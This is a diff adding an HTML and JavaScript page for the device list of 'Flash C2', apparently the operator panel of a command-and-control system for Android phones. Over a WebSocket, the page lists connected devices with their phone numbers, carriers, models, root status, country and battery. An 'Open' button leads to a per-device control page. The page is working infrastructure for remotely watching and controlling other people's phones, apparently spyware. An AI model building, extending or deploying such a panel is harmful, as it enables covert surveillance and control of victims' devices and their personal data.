@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<title>Flash C2 — Devices</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+<style>
+  .device-card-meta { display: flex; gap: .6rem; flex-wrap: wrap; margin-top: .5rem; }
+  .topbar-actions { display: flex; gap: .5rem; align-items: center; margin-left: auto; }
+  .stat-row { display: flex; gap: .75rem; padding: .5rem 1rem; overflow-x: auto; scrollbar-width: none; flex-shrink: 0; }
+  .stat-row::-webkit-scrollbar { display: none; }
+  .stat-chip {
+    flex-shrink: 0;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 100px;
+    padding: .35rem .9rem;
+    font-size: .8rem;
+    font-weight: 500;
+    display: flex; align-items: center; gap: .4rem;
+    color: var(--text2);
+  }
+  .stat-chip strong { color: var(--text); }
+  .search-wrap { padding: .5rem 1rem; flex-shrink: 0; }
+  .device-name  { font-weight: 700; font-size: .95rem; }
+  .device-phone { font-size: .8rem; color: var(--text2); }
+  .btn-open {
+    background: var(--red); color: #fff;
+    border: none; border-radius: var(--radius-sm);
+    padding: .4rem .9rem; font-size: .8rem; font-weight: 600;
+    cursor: pointer; flex-shrink: 0;
+  }
+</style>
+</head>
+<body>
+
+<div class="app-layout">
+
+  <!-- Topbar -->
+  <div class="topbar">
+    <div class="topbar-logo">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#E53935" stroke-width="2.5">
+        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
+      </svg>
+      <span>Flash <span>C2</span></span>
+    </div>
+    <div class="topbar-actions">
+      <div class="status-bar" id="connStatus">
+        <div class="dot dot-gray"></div>
+        Connecting…
+      </div>
+      <button class="btn btn-ghost btn-sm" id="logoutBtn">Logout</button>
+    </div>
+  </div>
+
+  <!-- Stats row -->
+  <div class="stat-row">
+    <div class="stat-chip">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--green)" stroke-width="2.5"><circle cx="12" cy="12" r="10"/></svg>
+      Online: <strong id="statOnline">0</strong>
+    </div>
+    <div class="stat-chip">Total: <strong id="statTotal">0</strong></div>
+    <div class="stat-chip">Ping: <strong id="statPing">—</strong></div>
+  </div>
+
+  <!-- Search -->
+  <div class="search-wrap">
+    <div class="search-box">
+      <svg class="search-icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
+      </svg>
+      <input class="input" id="searchInput" type="search" placeholder="Search devices…">
+    </div>
+  </div>
+
+  <!-- Device list -->
+  <div class="app-body">
+    <div class="devices-grid" id="deviceList">
+      <div class="empty" id="emptyState">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+          <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+          <line x1="12" y1="18" x2="12.01" y2="18"/>
+        </svg>
+        <span>No devices connected</span>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- Toast container -->
+<div id="toast-container"></div>
+
+<script src="/js/ws-client.js"></script>
+<script>
+(async function () {
+  // ── Auth check ────────────────────────────────────────────────────────────
+  const meRes = await fetch('/auth/me');
+  if (!meRes.ok) { location.href = '/login.html'; return; }
+  const me = await meRes.json();
+
+  // ── State ─────────────────────────────────────────────────────────────────
+  let allDevices = [];
+  const searchInput = document.getElementById('searchInput');
+
+  // ── WebSocket ─────────────────────────────────────────────────────────────
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  const ws = new FlashWS(`${proto}://${location.host}/ws/dashboard`);
+
+  const statusEl = document.getElementById('connStatus');
+  function setStatus(text, cls) {
+    statusEl.textContent = '';
+    const dot = document.createElement('div');
+    dot.className = cls === 'connected' ? 'dot dot-green' : 'dot dot-gray';
+    statusEl.appendChild(dot);
+    statusEl.appendChild(document.createTextNode(' ' + text));
+    statusEl.className = 'status-bar ' + (cls || '');
+  }
+
+  ws.addEventListener('open',         () => setStatus('Connected', 'connected'));
+  ws.addEventListener('close',        () => setStatus('Reconnecting…', ''));
+  ws.addEventListener('reconnecting', e  => setStatus(`Reconnect #${e.detail.attempt}…`, ''));
+  ws.addEventListener('latency',      e  => { document.getElementById('statPing').textContent = e.detail + 'ms'; });
+
+  ws.addEventListener('message', e => {
+    const msg = e.detail;
+    if (msg.type === 'device_list') renderDevices(msg.devices);
+  });
+
+  // ── Render ────────────────────────────────────────────────────────────────
+  function renderDevices(list) {
+    allDevices = list;
+    applyFilter();
+    document.getElementById('statOnline').textContent = list.filter(d => d.online).length;
+    document.getElementById('statTotal').textContent  = list.length;
+  }
+
+  function applyFilter() {
+    const q = searchInput.value.toLowerCase();
+    const filtered = q
+      ? allDevices.filter(d =>
+          (d.alias||'').toLowerCase().includes(q) ||
+          (d.model||'').toLowerCase().includes(q) ||
+          (d.phoneNumber||'').includes(q) ||
+          (d.country||'').toLowerCase().includes(q)
+        )
+      : allDevices;
+
+    const container = document.getElementById('deviceList');
+    const empty     = document.getElementById('emptyState');
+
+    if (!filtered.length) {
+      container.innerHTML = '';
+      container.appendChild(empty);
+      empty.style.display = '';
+      return;
+    }
+    empty.style.display = 'none';
+
+    // Sort: online first, then by name
+    filtered.sort((a, b) => (b.online - a.online) || (a.alias || a.id).localeCompare(b.alias || b.id));
+
+    container.innerHTML = '';
+    for (const d of filtered) container.appendChild(buildCard(d));
+  }
+
+  function buildCard(d) {
+    const initials = (d.alias || d.model || '?').substring(0, 2).toUpperCase();
+    const card = document.createElement('div');
+    card.className = 'device-card flex gap-3' + (d.online ? '' : ' offline');
+    card.innerHTML = `
+      <div class="device-avatar">${initials}</div>
+      <div style="flex:1;min-width:0">
+        <div class="flex items-center gap-2">
+          <span class="device-name truncate">${esc(d.alias || d.model || d.id)}</span>
+          ${d.online
+            ? `<span class="badge badge-green"><span class="dot dot-green"></span>Online</span>`
+            : `<span class="badge badge-gray">Offline</span>`}
+          ${d.isRooted ? `<span class="badge badge-red">Root</span>` : ''}
+        </div>
+        <div class="device-phone">${esc(d.phoneNumber || '')} ${d.carrier ? '• '+esc(d.carrier) : ''}</div>
+        <div class="device-card-meta">
+          ${d.model         ? `<span class="text-xs text-muted">${esc(d.model)}</span>` : ''}
+          ${d.androidVersion? `<span class="text-xs text-muted">Android ${esc(d.androidVersion)}</span>` : ''}
+          ${d.country       ? `<span class="text-xs text-muted">${esc(d.country)}</span>` : ''}
+          ${d.batteryLevel != null ? `<span class="text-xs text-muted">🔋 ${d.batteryLevel}%</span>` : ''}
+          ${d.watchers      ? `<span class="text-xs text-muted">👁 ${d.watchers}</span>` : ''}
+        </div>
+      </div>
+      ${d.online
+        ? `<button class="btn-open" data-id="${esc(d.id)}">Open</button>`
+        : ''}
+    `;
+    card.addEventListener('click', (e) => {
+      if (e.target.closest('.btn-open') || d.online) {
+        location.href = `/device.html?id=${encodeURIComponent(d.id)}`;
+      }
+    });
+    return card;
+  }
+
+  searchInput.addEventListener('input', applyFilter);
+
+  document.getElementById('logoutBtn').addEventListener('click', async () => {
+    await fetch('/auth/logout', { method: 'POST' });
+    location.href = '/login.html';
+  });
+
+  function esc(s) {
+    if (s == null) return '';
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+
+  function toast(msg, type = '') {
+    const t = document.createElement('div');
+    t.className = 'toast ' + type;
+    t.textContent = msg;
+    document.getElementById('toast-container').appendChild(t);
+    setTimeout(() => t.remove(), 2800);
+  }
+})();
+</script>
+</body>
+</html>
